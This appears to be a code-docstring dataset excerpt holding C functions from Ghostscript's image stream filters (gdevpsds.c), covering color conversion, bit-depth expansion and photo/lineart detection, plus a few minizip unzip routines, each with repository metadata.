ss->output_depth;) {\n\t\tuint fitting = (uint)(8 - ss->output_bits_buffered);\n\t\tuint v, w, u, n, m;\n\n\t\tif (pw->ptr >= pw->limit)\n\t\t    return 1;\n\t\tv = ss->output_color[ss->output_component_index];\n\t\tn = ss->output_bits_per_sample - ss->output_component_bits_written; /* no. of bits left */\n\t\tw = v - ((v >> n) << n); /* the current component without written bits. */\n\t\tif (fitting > n)\n\t\t    fitting = n; /* no. of bits to write. */\n\t\tm = n - fitting; /* no. of bits will left. */\n\t\tu = w >> m;  /* bits to write (near lsb). */\n\t\tss->output_bits_buffer |= u << (8 - ss->output_bits_buffered - fitting);\n\t\tss->output_bits_buffered += fitting;\n\t\tif (ss->output_bits_buffered >= 8) {\n\t\t    *(++pw->ptr) = ss->output_bits_buffer;\n\t\t    ss->output_bits_buffered = 0;\n\t\t    ss->output_bits_buffer = 0;\n\t\t}\n\t\tss->output_component_bits_written += fitting;\n\t\tif (ss->output_component_bits_written >= ss->output_bits_per_sample) {\n\t\t    ss->output_component_index++;\n\t\t    ss->output_component_bits_written = 0;\n\t\t}\n\t    }\n\t    ss->row_bits_passed += ss->bits_per_sample * ss->depth;\n\t    continue;\n\t}\n\tif (ss->input_bits_buffered < ss->bits_per_sample) {\n\t    if (pr->ptr >= pr->limit)\n\t\treturn 0;\n\t    ss->input_bits_buffer = (ss->input_bits_buffer << 8) | *++pr->ptr;\n\t    ss->input_bits_buffered += 8;\n\t    /* fixme: delay shifting the input ptr until input_bits_buffer is cleaned. */\n\t}\n\tif (ss->input_bits_buffered >= ss->bits_per_sample) {\n\t    uint w;\n\n\t    ss->input_bits_buffered -= ss->bits_per_sample;\n\t    ss->input_color[ss->input_component_index] = w = ss->input_bits_buffer >> ss->input_bits_buffered;\n\t    ss->input_bits_buffer &= ~(w << ss->input_bits_buffered);\n\t    ss->input_component_index++;\n\t    if (ss->input_component_index >= ss->depth) {\n\t\tint code = ss->convert_color(ss);\n\n\t\tif (code < 0)\n\t\t    return ERRC;\n\t\tss->output_component_index = 0;\n\t\tss->input_component_index = 0;\n\t    }\n\t}\n    }\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Process a buffer. */\n", "func_signal": "private int\ns_compr_chooser_process(stream_state * st, stream_cursor_read * pr,\n\t     stream_cursor_write * pw, bool last)", "code": "{\n    stream_compr_chooser_state *const ss = (stream_compr_chooser_state *) st;\n    int l = pr->limit - pr->ptr;\n\n    if (ss->width >= 3) /* Can't process narrow images. */\n\ts_compr_chooser__unpack_and_recognize(ss, pr->ptr + 1, l);\n    pr->ptr += l;\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Test code */\n", "func_signal": "void\ntest_IE(void)", "code": "{\n    const stream_template *const template = &s_IE_template;\n    stream_IE_state state;\n    stream_state *const ss = (stream_state *)&state;\n    static const float decode[6] = {1, 0, 1, 0, 1, 0};\n    static const byte in[] = {\n\t/*\n\t * Each row is 3 pixels x 3 components x 4 bits.  Processing the\n\t * first two rows doesn't cause an error; processing all 3 rows\n\t * does.\n\t */\n\t0x12, 0x35, 0x67, 0x9a, 0xb0,\n\t0x56, 0x7d, 0xef, 0x12, 0x30,\n\t0x88, 0x88, 0x88, 0x88, 0x80\n    };\n    byte table[3 * 5];\n    int n;\n\n    template->set_defaults(ss);\n    state.BitsPerComponent = 4;\n    state.NumComponents = 3;\n    state.Width = 3;\n    state.BitsPerIndex = 2;\n    state.Decode = decode;\n    gs_bytestring_from_bytes(&state.Table, table, 0, sizeof(table));\n    for (n = 10; n <= 15; n += 5) {\n\tstream_cursor_read r;\n\tstream_cursor_write w;\n\tbyte out[100];\n\tint status;\n\n\ts_IE_init(ss);\n\tr.ptr = in; --r.ptr;\n\tr.limit = r.ptr + n;\n\tw.ptr = out; --w.ptr;\n\tw.limit = w.ptr + sizeof(out);\n\tmemset(table, 0xcc, sizeof(table));\n\tmemset(out, 0xff, sizeof(out));\n\tdprintf1(\"processing %d bytes\\n\", n);\n\tstatus = template->process(ss, &r, &w, true);\n\tdprintf3(\"%d bytes read, %d bytes written, status = %d\\n\",\n\t\t (int)(r.ptr + 1 - in), (int)(w.ptr + 1 - out), status);\n\tdebug_dump_bytes(table, table + sizeof(table), \"table\");\n\tdebug_dump_bytes(out, w.ptr + 1, \"out\");\n    }\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Initialize an expansion or reduction stream. */\n", "func_signal": "int\ns_1248_init(stream_1248_state *ss, int Columns, int samples_per_pixel)", "code": "{\n    ss->samples_per_row = Columns * samples_per_pixel;\n    return ss->template->init((stream_state *)ss);\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Set image dimensions. */\n", "func_signal": "int\ns_compr_chooser_set_dimensions(stream_compr_chooser_state * ss, int width, \n\t\t    int height, int depth, int bits_per_sample)", "code": "{\n    ss->width = width;\n    ss->height = height;\n    ss->depth = depth;\n    ss->bits_per_sample = bits_per_sample;\n    ss->sample = gs_alloc_bytes(ss->memory, width * depth, \"s_compr_chooser_set_dimensions\");\n    if (ss->sample == 0)\n\treturn_error(gs_error_VMerror);\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Recognize photo/lineart. */\n", "func_signal": "private void\ns_compr_chooser__recognize(stream_compr_chooser_state * ss)", "code": "{\n    int i;\n    byte *p = ss->sample;\n\n    for (i = 0; i < ss->depth; i++, p += ss->width)\n\ts_compr_chooser__estimate_row(ss, p);\n    /* todo: make decision */\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Initialize the state. */\n", "func_signal": "private int\ns_Subsample_init(stream_state * st)", "code": "{\n    stream_Subsample_state *const ss = (stream_Subsample_state *) st;\n\n    ss->x = ss->y = 0;\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Process a buffer. */\n", "func_signal": "private int\ns_IE_process(stream_state * st, stream_cursor_read * pr,\n\t     stream_cursor_write * pw, bool last)", "code": "{\n    stream_IE_state *const ss = (stream_IE_state *) st;\n    /* Constant values from the state */\n    const int bpc = ss->BitsPerComponent;\n    const int num_components = ss->NumComponents;\n    const int end_index = (1 << ss->BitsPerIndex) * num_components;\n    byte *const table = ss->Table.data;\n    byte *const key = table + end_index;\n    /* Dynamic values from the state */\n    uint byte_in = ss->byte_in;\n    int in_bits_left = ss->in_bits_left;\n    int next_component = ss->next_component;\n    uint byte_out = ss->byte_out;\n    /* Other dynamic values */\n    const byte *p = pr->ptr;\n    const byte *rlimit = pr->limit;\n    byte *q = pw->ptr;\n    byte *wlimit = pw->limit;\n    int status = 0;\n\n    for (;;) {\n\tuint hash, reprobe;\n\tint i, index;\n\n\t/* Check for a filled output byte. */\n\tif (byte_out >= 0x100) {\n\t    if (q >= wlimit) {\n\t\tstatus = 1;\n\t\tbreak;\n\t    }\n\t    *++q = (byte)byte_out;\n\t    byte_out = 1;\n\t}\n\t/* Acquire a complete input value. */\n\twhile (next_component < num_components) {\n\t    const float *decode = &ss->Decode[next_component * 2];\n\t    int sample;\n\n\t    if (in_bits_left == 0) {\n\t\tif (p >= rlimit)\n\t\t    goto out;\n\t\tbyte_in = *++p;\n\t\tin_bits_left = 8;\n\t    }\n\t    /* An input sample can never span a byte boundary. */\n\t    in_bits_left -= bpc;\n\t    sample = (byte_in >> in_bits_left) & ((1 << bpc) - 1);\n\t    /* Scale the sample according to Decode. */\n\t    sample = (int)((decode[0] +\n\t\t\t    (sample / (float)((1 << bpc) - 1) *\n\t\t\t     (decode[1] - decode[0]))) * 255 + 0.5);\n\t    key[next_component++] =\n\t\t(sample < 0 ? 0 : sample > 255 ? 255 : (byte)sample);\n\t}\n\t/* Look up the input value. */\n\tfor (hash = 0, i = 0; i < num_components; ++i)\n\t    hash = hash + 23 * key[i];  /* adhoc */\n\treprobe = (hash / countof(ss->hash_table)) | 137;  /* adhoc */\n\tfor (hash %= countof(ss->hash_table);\n\t     memcmp(table + ss->hash_table[hash], key, num_components);\n\t     hash = (hash + reprobe) % countof(ss->hash_table)\n\t     )\n\t    DO_NOTHING;\n\tindex = ss->hash_table[hash];\n\tif (index == end_index) {\n\t    /* The match was on an empty entry. */\n\t    if (ss->next_index == end_index) {\n\t\t/* Too many different values. */\n\t\tstatus = ERRC;\n\t\tbreak;\n\t    }\n\t    ss->hash_table[hash] = index = ss->next_index;\n\t    ss->next_index += num_components;\n\t    memcpy(table + index, key, num_components);\n\t}\n\tbyte_out = (byte_out << ss->BitsPerIndex) + index / num_components;\n\tnext_component = 0;\n\tif (++(ss->x) == ss->Width) {\n\t    /* Handle input and output padding. */\n\t    in_bits_left = 0;\n\t    if (byte_out != 1)\n\t\twhile (byte_out < 0x100)\n\t\t    byte_out <<= 1;\n\t    ss->x = 0;\n\t}\n    }\nout:\n    pr->ptr = p;\n    pw->ptr = q;\n    ss->byte_in = byte_in;\n    ss->in_bits_left = in_bits_left;\n    ss->next_component = next_component;\n    ss->byte_out = byte_out;\n    /* For simplicity, always update the record of the table size. */\n    ss->Table.data[ss->Table.size - 1] =\n\t(ss->next_index == 0 ? 0 :\n\t ss->next_index / ss->NumComponents - 1);\n    return status;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Uppack data and recognize photo/lineart. */\n", "func_signal": "private void\ns_compr_chooser__unpack_and_recognize(stream_compr_chooser_state *const ss, \n\t\t\t\t      const byte *data, int length)", "code": "{   \n    /*\n     * Input samples are packed ABCABCABC..., but the sample[] array of\n     * unpacked values is stored AAA...BBB...CCC.  i counts samples within\n     * a pixel, multiplied by width; j counts pixels.\n     */\n    uint i = (ss->samples_count % ss->depth) * ss->width;\n    uint j = ss->samples_count / ss->depth;\n    const byte *p = data;\n    int l = length;\n\n    while (l) {\n\tif (ss->bits_left < 8) {\n\t    uint k = (sizeof(ss->packed_data) * 8 - ss->bits_left) / 8;\n\n\t    k = min(k, l);\n\t    for (; k; k--, l--, p++, ss->bits_left += 8)\n\t\tss->packed_data = (ss->packed_data << 8) + *p;\n\t}\n\twhile (ss->bits_left >= ss->bits_per_sample) {\n\t    uint k = ss->bits_left - ss->bits_per_sample;\n\t    ulong v = ss->packed_data >> k;\n\n\t    ss->packed_data -= (v << k);\n\t    ss->bits_left -= ss->bits_per_sample;\n\t    if (ss->bits_per_sample > 8)\n\t\tv >>= ss->bits_per_sample - 8;\n\t    else\n\t\tv <<= 8 - ss->bits_per_sample;\n\t    ss->sample[i + j] = (byte)v;  /* scaled to 0...255 */\n\t    i += ss->width;\n\t    if (i >= ss->width * ss->depth)\n\t\ti = 0, j++;\n\t    ss->samples_count++;\n\t    if (ss->samples_count >= ss->width * ss->depth) {\n\t\ts_compr_chooser__recognize(ss);\n\t\tss->packed_data = 0;\n\t\tss->bits_left = 0;\n\t\tss->samples_count = 0;\n\t\ti = j = 0;\n\t    }\n\t}\n    }\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Initialize the state. */\n", "func_signal": "private int\ns_1_init(stream_state * st)", "code": "{\n    stream_1248_state *const ss = (stream_1248_state *) st;\n\n    ss->left = ss->samples_per_row;\n    ss->bits_per_sample = 1;\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Initialize the state. */\n", "func_signal": "private int\ns_image_colors_init(stream_state * st)", "code": "{\n    stream_image_colors_state *const ss = (stream_image_colors_state *) st;\n\n    ss->width = ss->height = ss->depth = ss->bits_per_sample = 0;\n    ss->output_bits_buffer = 0;\n    ss->output_bits_buffered = 0;\n    ss->output_depth = 1;\n    ss->output_component_index = ss->output_depth;\n    ss->output_bits_per_sample = 1;\n    ss->output_component_bits_written = 0;\n    ss->raster = 0;\n    ss->row_bits = 0;\n    ss->row_bits_passed = 0;\n    ss->row_alignment_bytes = 0;\n    ss->row_alignment_bytes_left = 0;\n    ss->input_component_index = 0;\n    ss->input_bits_buffer = 0;\n    ss->input_bits_buffered = 0;\n    ss->convert_color = 0;\n    ss->pcs = 0;\n    ss->pdev = 0;\n    ss->pis = 0;\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Get choice */\n", "func_signal": "uint \ns_compr_chooser__get_choice(stream_compr_chooser_state *ss, bool force)", "code": "{\n    ulong plateaus = min(ss->lower_plateaus, ss->upper_plateaus);\n\n    if (ss->choice)\n\treturn ss->choice;\n    if (force) {\n\tif (ss->gradients > plateaus / 12) /* messenger16.pdf, page 3. */\n\t    return 1; /* photo */\n\telse if (plateaus / 5000 >= ss->gradients)\n\t    return 2; /* lineart */\n    }\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Set default parameter values (actually, just clear pointers). */\n", "func_signal": "private void\ns_C2R_set_defaults(stream_state * st)", "code": "{\n    stream_C2R_state *const ss = (stream_C2R_state *) st;\n\n    ss->pis = 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Release the state. */\n", "func_signal": "private void\ns_Average_release(stream_state * st)", "code": "{\n    stream_Average_state *const ss = (stream_Average_state *) st;\n\n    gs_free_object(st->memory, ss->sums, \"Average sums\");\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Process one buffer. */\n", "func_signal": "private int\ns_C2R_process(stream_state * st, stream_cursor_read * pr,\n\t      stream_cursor_write * pw, bool last)", "code": "{\n    stream_C2R_state *const ss = (stream_C2R_state *) st;\n    const byte *p = pr->ptr;\n    const byte *rlimit = pr->limit;\n    byte *q = pw->ptr;\n    byte *wlimit = pw->limit;\n\n    for (; rlimit - p >= 4 && wlimit - q >= 3; p += 4, q += 3) {\n\tbyte bc = p[1], bm = p[2], by = p[3], bk = p[4];\n\tfrac rgb[3];\n\n\tcolor_cmyk_to_rgb(byte2frac(bc), byte2frac(bm), byte2frac(by),\n\t\t\t  byte2frac(bk), ss->pis, rgb);\n\tq[1] = frac2byte(rgb[0]);\n\tq[2] = frac2byte(rgb[1]);\n\tq[3] = frac2byte(rgb[2]);\n    }\n    pr->ptr = p;\n    pw->ptr = q;\n    return (rlimit - p < 4 ? 0 : 1);\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Initialize a CMYK => RGB conversion stream. */\n", "func_signal": "int\ns_C2R_init(stream_C2R_state *ss, const gs_imager_state *pis)", "code": "{\n    ss->pis = pis;\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Initialize the state. */\n", "func_signal": "private int\ns_compr_chooser_init(stream_state * st)", "code": "{\n    stream_compr_chooser_state *const ss = (stream_compr_chooser_state *) st;\n\n    ss->choice = 0;\n    ss->width = ss->height = ss->depth = ss->bits_per_sample = 0;\n    ss->sample = 0;\n    ss->samples_count = 0;\n    ss->bits_left = 0;\n    ss->packed_data = 0;\n    ss->lower_plateaus = ss->upper_plateaus = 0;\n    ss->gradients = 0;\n    return 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Set default parameter values (actually, just clear pointers). */\n", "func_signal": "private void\ns_Average_set_defaults(stream_state * st)", "code": "{\n    stream_Average_state *const ss = (stream_Average_state *) st;\n\n    s_Downsample_set_defaults(st);\n    /* Clear pointers */\n    ss->sums = 0;\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Release state. */\n", "func_signal": "private void\ns_compr_chooser_release(stream_state * st)", "code": "{\n    stream_compr_chooser_state *const ss = (stream_compr_chooser_state *) st;\n\n    gs_free_object(ss->memory, ss->sample, \"s_compr_chooser_release\");\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Estimate a row for photo/lineart recognition. */\n", "func_signal": "private void\ns_compr_chooser__estimate_row(stream_compr_chooser_state *const ss, byte *p)", "code": "{   \n    /*\tThis function uses a statistical algorithm being not well defined.\n\n\tWe compute areas covered by gradients,\n\tseparately with small width (line art)\n\tand with big width (photo).\n\tMaking the choice based on the areas.\n\n\tNote that we deal with horizontal frequencies only.\n\tDealing with vertical ones would be too expensive.\n    */\n    const int delta = 256 / 16; /* about 1/16 of the color range */\n    const int max_lineart_boundary_width = 3; /* pixels */\n    const int max_gradient_constant = 10; /* pixels */\n    int i, j0 = 0, j1 = 0;\n    int w0 = p[0], w1 = p[0], v;\n    ulong plateau_count = 0, lower_plateaus = 0;\n    ulong upper_plateaus = 0, gradients = 0;\n    bool lower = false, upper = false;\n\n    for (i = 1; i < ss->width; i++) {\n\tv = p[i];\n\tif (!lower) {\n\t    if (w1 < v) {\n\t\tif (!upper)\n\t\t    j1 = i - 1;\n\t\tw1 = v;\n\t\tupper = true;\n\t    } else if (w1 == v && j1 < i - max_gradient_constant)\n\t\tj1 = i - max_gradient_constant; /* inner constant plateaw */\n\t    else if (upper && w1 - delta > v) {\n\t\t/* end of upper plateau at w1-delta...w1 */\n\t\tfor (j0 = i - 1; j0 > j1 && w1 - delta <= p[j0]; j0--) DO_NOTHING;\n\t\t/* upper plateau j0+1...i-1 */\n\t\tif(j0 > 0 && i < ss->width - 1) /* ignore sides */\n\t\t    upper_plateaus += i - j0;\n\t\tplateau_count ++;\n\t\tif (j0 > j1) {\n\t\t    /* upgrade j1...j0 */\n\t\t    if (j0 > j1 + max_lineart_boundary_width)\n\t\t\tgradients += j0 - j1;\n\t\t}\n\t\tj1 = i;\n\t\tupper = false;\n\t\tw0 = w1;\n\t\tcontinue;\n\t    }\n\t}\n\tif (!upper) {\n\t    if (w0 > v) {\n\t\tif (!lower)\n\t\t    j1 = i - 1;\n\t\tw0 = v; \n\t\tlower = true;\n\t    } else if (w0 == v && j1 < i - max_gradient_constant)\n\t\tj1 = i - max_gradient_constant; /* inner constant plateaw */\n\t    else if (lower && w0 + delta < v) {\n\t\t/* end of lower plateau at w0...w0+delta */\n\t\tfor (j0 = i - 1; j0 > j1 && w0 + delta >= p[j0]; j0--) DO_NOTHING;\n\t\t/* lower plateau j0+1...i-1 */\n\t\tif(j0 > 0 && i < ss->width - 1) /* ignore sides */\n\t\t    lower_plateaus += i - j0;\n\t\tplateau_count ++;\n\t\tif (j0 > j1) {\n\t\t    /* downgrade j1...j0 */\n\t\t    if (j0 > j1 + max_lineart_boundary_width)\n\t\t\tgradients += j0 - j1;\n\t\t}\n\t\tj1 = i;\n\t\tlower = false;\n\t\tw1 = w0;\n\t    }\n\t}\n    }\n    if (plateau_count > ss->width / 6) {\n\t/*  Possibly a dithering, can't recognize.\n\t    It would be better to estimate frequency histogram rather than \n\t    rough quantity, but we hope that the simpler test can work fine.\n\t*/\n    } else if (!plateau_count) /* a pseudo-constant color through entire row */\n\tDO_NOTHING; /* ignore such lines */\n    else {\n\tint plateaus;\n\tss->lower_plateaus += lower_plateaus;\n\tss->upper_plateaus += upper_plateaus;\n\tss->gradients += gradients;\n\tplateaus = min(ss->lower_plateaus, ss->upper_plateaus); /* (fore/back)ground */\n\tif (ss->gradients >= 10000 && ss->gradients > plateaus / 6)\n\t    ss->choice = 1; /* choice is made : photo */\n\telse if (plateaus >= 100000 && plateaus / 5000 >= ss->gradients)\n\t    ss->choice = 2; /* choice is made : lineart */\n    }\n}", "path": "plan9/sys/src/cmd/gs/src/gdevpsds.c", "commit_date": "2006-01-17 00:00:00", "repo_name": "0intro/plan9", "stars": 861, "license": "mit", "language": "c", "size": 106193}
{"docstring": "/* Additions by RX '2004 */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetOffset64(unzFile file)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL)\n          return 0; //UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n      return 0;\n    if (s->gi.number_entry != 0 && s->gi.number_entry != 0xffff)\n      if (s->num_file==s->gi.number_entry)\n         return 0;\n    return s->pos_in_central_dir;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Close a ZipFile opened with unzipOpen.\n  If there is files inside the .Zip opened with unzipOpenCurrentFile (see later),\n    these files MUST be closed with unzipCloseCurrentFile before call unzipClose.\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzClose (unzFile file)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    if (s->pfile_in_zip_read!=NULL)\n        unzCloseCurrentFile(file);\n\n    ZCLOSE64(s->z_filefunc, s->filestream);\n    TRYFREE(s);\n    return UNZ_OK;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Open for reading data the current file in the zipfile.\n  If there is no error and the file is opened, the return value is UNZ_OK.\n*/\n", "func_signal": "extern int ZEXPORT unzOpenCurrentFile3 (unzFile file, int* method,\n                                            int* level, int raw, const char* password)", "code": "{\n    int err=UNZ_OK;\n    uInt iSizeVar;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    ZPOS64_T offset_local_extrafield;  /* offset of the local extra field */\n    uInt  size_local_extrafield;    /* size of the local extra field */\n#    ifndef NOUNCRYPT\n    char source[12];\n#    else\n    if (password != NULL)\n        return UNZ_PARAMERROR;\n#    endif\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_PARAMERROR;\n\n    if (s->pfile_in_zip_read != NULL)\n        unzCloseCurrentFile(file);\n\n    if (unz64local_CheckCurrentFileCoherencyHeader(s,&iSizeVar, &offset_local_extrafield,&size_local_extrafield)!=UNZ_OK)\n        return UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info = (file_in_zip64_read_info_s*)ALLOC(sizeof(file_in_zip64_read_info_s));\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_INTERNALERROR;\n\n    pfile_in_zip_read_info->read_buffer=(char*)ALLOC(UNZ_BUFSIZE);\n    pfile_in_zip_read_info->offset_local_extrafield = offset_local_extrafield;\n    pfile_in_zip_read_info->size_local_extrafield = size_local_extrafield;\n    pfile_in_zip_read_info->pos_local_extrafield=0;\n    pfile_in_zip_read_info->raw=raw;\n\n    if (pfile_in_zip_read_info->read_buffer==NULL)\n    {\n        TRYFREE(pfile_in_zip_read_info);\n        return UNZ_INTERNALERROR;\n    }\n\n    pfile_in_zip_read_info->stream_initialised=0;\n\n    if (method!=NULL)\n        *method = (int)s->cur_file_info.compression_method;\n\n    if (level!=NULL)\n    {\n        *level = 6;\n        switch (s->cur_file_info.flag & 0x06)\n        {\n          case 6 : *level = 1; break;\n          case 4 : *level = 2; break;\n          case 2 : *level = 9; break;\n        }\n    }\n\n    if ((s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n        (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n        (s->cur_file_info.compression_method!=Z_DEFLATED))\n\n        err=UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info->crc32_wait=s->cur_file_info.crc;\n    pfile_in_zip_read_info->crc32=0;\n    pfile_in_zip_read_info->total_out_64=0;\n    pfile_in_zip_read_info->compression_method = s->cur_file_info.compression_method;\n    pfile_in_zip_read_info->filestream=s->filestream;\n    pfile_in_zip_read_info->z_filefunc=s->z_filefunc;\n    pfile_in_zip_read_info->byte_before_the_zipfile=s->byte_before_the_zipfile;\n\n    pfile_in_zip_read_info->stream.total_out = 0;\n\n    if ((s->cur_file_info.compression_method==Z_BZIP2ED) && (!raw))\n    {\n#ifdef HAVE_BZIP2\n      pfile_in_zip_read_info->bstream.bzalloc = (void *(*) (void *, int, int))0;\n      pfile_in_zip_read_info->bstream.bzfree = (free_func)0;\n      pfile_in_zip_read_info->bstream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->bstream.state = (voidpf)0;\n\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = (voidpf)0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=BZ2_bzDecompressInit(&pfile_in_zip_read_info->bstream, 0, 0);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_BZIP2ED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n#else\n      pfile_in_zip_read_info->raw=1;\n#endif\n    }\n    else if ((s->cur_file_info.compression_method==Z_DEFLATED) && (!raw))\n    {\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = 0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=inflateInit2(&pfile_in_zip_read_info->stream, -MAX_WBITS);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_DEFLATED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n        /* windowBits is passed < 0 to tell that there is no zlib header.\n         * Note that in this case inflate *requires* an extra \"dummy\" byte\n         * after the compressed stream in order to complete decompression and\n         * return Z_STREAM_END.\n         * In unzip, i don't wait absolutely Z_STREAM_END because I known the\n         * size of both compressed and uncompressed data\n         */\n    }\n    pfile_in_zip_read_info->rest_read_compressed =\n            s->cur_file_info.compressed_size ;\n    pfile_in_zip_read_info->rest_read_uncompressed =\n            s->cur_file_info.uncompressed_size ;\n\n\n    pfile_in_zip_read_info->pos_in_zipfile =\n            s->cur_file_info_internal.offset_curfile + SIZEZIPLOCALHEADER +\n              iSizeVar;\n\n    pfile_in_zip_read_info->stream.avail_in = (uInt)0;\n\n    s->pfile_in_zip_read = pfile_in_zip_read_info;\n                s->encrypted = 0;\n\n#    ifndef NOUNCRYPT\n    if (password != NULL)\n    {\n        int i;\n        s->pcrc_32_tab = get_crc_table();\n        init_keys(password,s->keys,s->pcrc_32_tab);\n        if (ZSEEK64(s->z_filefunc, s->filestream,\n                  s->pfile_in_zip_read->pos_in_zipfile +\n                     s->pfile_in_zip_read->byte_before_the_zipfile,\n                  SEEK_SET)!=0)\n            return UNZ_INTERNALERROR;\n        if(ZREAD64(s->z_filefunc, s->filestream,source, 12)<12)\n            return UNZ_INTERNALERROR;\n\n        for (i = 0; i<12; i++)\n            zdecode(s->keys,s->pcrc_32_tab,source[i]);\n\n        s->pfile_in_zip_read->pos_in_zipfile+=12;\n        s->encrypted=1;\n    }\n#    endif\n\n\n    return UNZ_OK;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
